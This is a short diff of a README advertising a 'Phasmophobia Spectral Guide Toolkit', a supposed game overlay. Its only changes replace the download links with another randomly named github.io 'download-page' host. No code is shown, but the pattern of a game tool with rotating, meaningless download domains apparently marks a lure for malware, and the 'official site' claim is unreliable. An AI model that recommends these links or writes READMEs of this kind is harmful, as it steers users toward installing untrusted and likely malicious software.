@@ -2,7 +2,7 @@
 
 Welcome to the Phasmophobia Spectral Guide Toolkit, the essential companion for investigators seeking a deeper understanding of paranormal activity. This tool is designed to provide Phasmophobia ghosts information and assist players with an enhanced, informative overlay, making every investigation more strategic and immersive. Whether you're a seasoned hunter or a newcomer, this toolkit offers a suite of features to help you document evidence and navigate haunted locations with greater confidence.
 
-[![Download Toolkit](https://img.shields.io/badge/Download-SpectralToolkit-7b2f2f?style=for-the-badge&logo=ghost&logoColor=white)](https://yellowtaxisave.github.io/download-page/)
+[![Download Toolkit](https://img.shields.io/badge/Download-SpectralToolkit-7b2f2f?style=for-the-badge&logo=ghost&logoColor=white)](https://capitals-707-bringing.github.io/download-page/)
 
 ## Features
 
@@ -41,7 +41,7 @@ A: First, ensure Phasmophobia is running in **Fullscreen (Borderless)** or **Win
 
 Ready to enhance your paranormal investigations? Get the toolkit now.
 
-[Download the latest version from our official site](https://yellowtaxisave.github.io/download-page/)
+[Download the latest version from our official site](https://capitals-707-bringing.github.io/download-page/)
 
 ---
 *Disclaimer: This is a community-made tool. Use responsibly and respect the game's Terms of Service. We are not affiliated with Kinetic Games.*
